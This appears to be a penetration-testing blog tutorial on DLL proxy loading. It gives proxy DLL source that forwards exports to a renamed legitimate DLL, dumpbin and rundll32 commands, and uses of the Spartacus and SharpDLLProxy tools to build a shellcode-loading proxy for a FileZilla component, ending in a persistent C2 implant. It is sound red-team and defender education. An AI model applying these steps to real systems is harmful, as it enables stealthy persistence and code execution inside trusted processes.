DLL Proxy Loading is a technique which an arbitrary DLL exports the same functions as the legitimate DLL and forwards the calls to the legitimate DLL in an attempt to not disrupt the execution flow so the binary is executed as normal. The technique falls under the category of [DLL Hijacking](https://pentestlab.blog/2017/03/27/dll-hijacking/) and it is typically utilized as a stealthier method to load an arbitrary DLL without breaking the original operation of a process which might be an indicator of compromise for defenders.

When a process is initiated DLL’s are also loaded and make calls to exported functions as illustrated in the diagram below:

[![](https://pentestlab.blog/wp-content/uploads/2024/04/dll-loading.jpg?w=1024)](https://pentestlab.blog/wp-content/uploads/2024/04/dll-loading.jpg)

DLL Loading

The DLL Proxy Loading technique requires an arbitrary DLL that will be planted in the same directory and with the same name of the legitimate DLL and will proxy the same exports as the original DLL. However, the arbitrary DLL will also load the implant code and therefore code will executed under the context of a trusted process.

[![](https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxy-loading.jpg?w=1024)](https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxy-loading.jpg)

DLL Proxy Loading

The following DLL code exports the following functions:

1. exportedFunction1
2. exportedFunction2
3. exportedFunction3

|   |   |
|---|---|
|1<br><br>2<br><br>3<br><br>4<br><br>5<br><br>6<br><br>7<br><br>8<br><br>9<br><br>10<br><br>11<br><br>12<br><br>13<br><br>14<br><br>15<br><br>16<br><br>17<br><br>18<br><br>19<br><br>20<br><br>21<br><br>22<br><br>23<br><br>24<br><br>25<br><br>26<br><br>27<br><br>28<br><br>29<br><br>30<br><br>31<br><br>32|`#include "pch.h"`<br><br>`BOOL` `APIENTRY DllMain(` `HMODULE` `hModule,`<br><br>                       `DWORD`  `ul_reason_for_call,`<br><br>                       `LPVOID` `lpReserved`<br><br>                     `)`<br><br>`{`<br><br>    `switch` `(ul_reason_for_call)`<br><br>    `{`<br><br>    `case` `DLL_PROCESS_ATTACH:`<br><br>    `case` `DLL_THREAD_ATTACH:`<br><br>    `case` `DLL_THREAD_DETACH:`<br><br>    `case` `DLL_PROCESS_DETACH:`<br><br>        `break``;`<br><br>    `}`<br><br>    `return` `TRUE;`<br><br>`}`<br><br>`extern` `"C"` `__declspec``(``dllexport``)` `VOID` `exportedFunction1(``int` `a)`<br><br>`{`<br><br>    `MessageBoxA(NULL,` `"Pentestlab exportedFunction1"``,` `"Pentestlab exportedFunction1"``, 0);`<br><br>`}`<br><br>`extern` `"C"` `__declspec``(``dllexport``)` `VOID` `exportedFunction2(``int` `a)`<br><br>`{`<br><br>    `MessageBoxA(NULL,` `"Pentestlab exportedFunction2"``,` `"Pentestlab exportedFunction2"``, 0);`<br><br>`}`<br><br>`extern` `"C"` `__declspec``(``dllexport``)` `VOID` `exportedFunction3(``int` `a)`<br><br>`{`<br><br>    `MessageBoxA(NULL,` `"Pentestlab exportedFunction3"``,` `"Pentestlab exportedFunction3"``, 0);`<br><br>`}`|

[![](https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-trusted-dll.png?w=1024)](https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-trusted-dll.png)

Trusted DLL

Executing the DLL will verify that the code is running as normal.

```
rundll32 DLL-Proxying.dll,exportedFunction1
```

[![](https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-messagebox.png?w=1024)](https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-messagebox.png)

DLL Proxy Loading – Message Box

From the offensive perspective prior to developing an arbitrary DLL, the exported functions of the legitimate DLL needs to be identified. This is feasible with the DLL export viewer.

[![](https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-dll-export-viewer.png?w=1024)](https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-dll-export-viewer.png)

DLL Export Viewer

Alternatively, Visual Studio contains a binary which can used to retrieve the exported functions.

```
dumpbin.exe /exports C:\temp\DLL-Proxying.dll
```

[![](https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-dll-export-dumpbin.png?w=1024)](https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-dll-export-dumpbin.png)

DLL Export – Dumpbin

On the proxy DLL a comment directive in the source code will match the exported functions of the legitimate DLL.

|                                                                                                                                                                                                                                           |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     |
| ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 1<br><br>2<br><br>3<br><br>4<br><br>5<br><br>6<br><br>7<br><br>8<br><br>9<br><br>10<br><br>11<br><br>12<br><br>13<br><br>14<br><br>15<br><br>16<br><br>17<br><br>18<br><br>19<br><br>20<br><br>21<br><br>22<br><br>23<br><br>24<br><br>25 | `#include "pch.h"`<br><br>`#pragma comment(linker, "/export:exportedFunction1=trusted1.exportedFunction1")`<br><br>`#pragma comment(linker, "/export:exportedFunction2=trusted1.exportedFunction2")`<br><br>`#pragma comment(linker, "/export:exportedFunction3=trusted1.exportedFunction3")`<br><br>`BOOL` `APIENTRY DllMain(``HMODULE` `hModule,`<br><br>    `DWORD`  `ul_reason_for_call,`<br><br>    `LPVOID` `lpReserved`<br><br>`)`<br><br>`{`<br><br>    `switch` `(ul_reason_for_call)`<br><br>    `{`<br><br>    `case` `DLL_PROCESS_ATTACH:`<br><br>    `{`<br><br>        `MessageBoxA(NULL,` `"DLL Proxy Loading"``,` `"DLL Proxy Loading"``, 0);`<br><br>    `}`<br><br>    `case` `DLL_THREAD_ATTACH:`<br><br>    `case` `DLL_THREAD_DETACH:`<br><br>    `case` `DLL_PROCESS_DETACH:`<br><br>        `break``;`<br><br>    `}`<br><br>    `return` `TRUE;`<br><br>`}` |

[![](https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-dll-proxy.png?w=1024)](https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-dll-proxy.png)

DLL Proxy

Similarly, using the _dumpbin_ binary will verify the exported functions.

```
dumpbin.exe /exports C:\Users\panag\source\repos\Pentestlab\DLL-Proxying\x64\Release\DLL-Proxying.dll
```

[![](https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-dll-export-proxy-dll-dumpbin.png?w=1024)](https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-dll-export-proxy-dll-dumpbin.png)

DLL Export Function – Dumpbin

Execution of the DLL will verify the exported functions are linked to the trusted DLL.

```
rundll32.exe DLL-Proxying.dll,pentestlab
```

[![](https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-messagebox-1.png?w=1024)](https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-messagebox-1.png)

DLL Proxy Loading – MessageBox

Accenture has developed a tool call _Spartacus_ which can be used to identify DLL Proxy opportunities.

```
Spartacus.exe --mode detect
```

[![](https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-spartacus.png?w=952)](https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-spartacus.png)

Spartacus – DLL Proxy Detection

In conjunction with Process Monitor it is also feasible to identify DLL Hijacking opportunities and export the output to a CSV file.

```
Spartacus.exe --mode dll --procmon Procmon64.exe --pml test.plm --csv ./output.csv --exports . --verbose
```

[![](https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-spartacus-dll-hijacking.png?w=958)](https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-spartacus-dll-hijacking.png)

Spartacus – DLL Hijacking

[Melvin Langvik](https://twitter.com/Flangvik) developed a tool called [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) which retrieves exported functions from a legitimate DLL and generates a proxy DLL template that can be used for DLL Side Loading.

```
SharpDLLProxy.exe --dll libnettle-8.dll --payload shellcode.bin
```

[![](https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-sharpdllproxy.png?w=1024)](https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-sharpdllproxy.png)

SharpDLLProxy

The tool will automatically grab the exported functions and will generate the DLL code. It should be noted that the shellcode should be dropped on disk in the form of a binary file (.bin).

[![](https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-sharpdllproxy-dll-proxy.png?w=1024)](https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-sharpdllproxy-dll-proxy.png)

SharpProxyDLL – DLL Proxy Code

Once the associated process is executed the proxy DLL will load the arbitrary code and will forward to the legitimate DLL the exported functions in order to enable the application to run as normal. It should be noted that the legitimate DLL should be renamed and the proxy DLL should contain the same name as the legitimate DLL file.

[![](https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-fzsftp.png?w=960)](https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-fzsftp.png)

fzsftp

A command and control session will established every time the associated process is executed on the system. From the perspective of persistence it is essential to choose a common Windows process.

[![](https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-c2.png?w=1024)](https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-c2.png)

DLL Proxy Loading – C2

[![](https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-implant.png?w=972)](https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-implant.png)

DLL Proxy Loading – Implant

The proxy DLL will run in the memory space of the process.

[![](https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-process-thread.png?w=476)](https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-process-thread.png)

#### Refs:
[mdsec.co.uk](https://www.mdsec.co.uk/2019/11/rdpthief-extracting-clear-text-credentials-from-remote-desktop-clients/)
[n00py.io](https://www.n00py.io/2021/05/dumping-plaintext-rdp-credentials-from-svchost-exe/)
[github/rdpThief](https://github.com/0x09AL/RdpThief)
[github/RdpThief](https://github.com/mantvydasb/RdpThief)
[github/SharpRdpThief](https://github.com/passthehashbrowns/SharpRDPThief)
[iredTeam](https://www.ired.team/offensive-security/code-injection-process-injection/api-monitoring-and-hooking-for-offensive-tooling)
[labs.f-secure.com](https://labs.f-secure.com/blog/attack-detection-fundamentals-2021-windows-lab-3/)

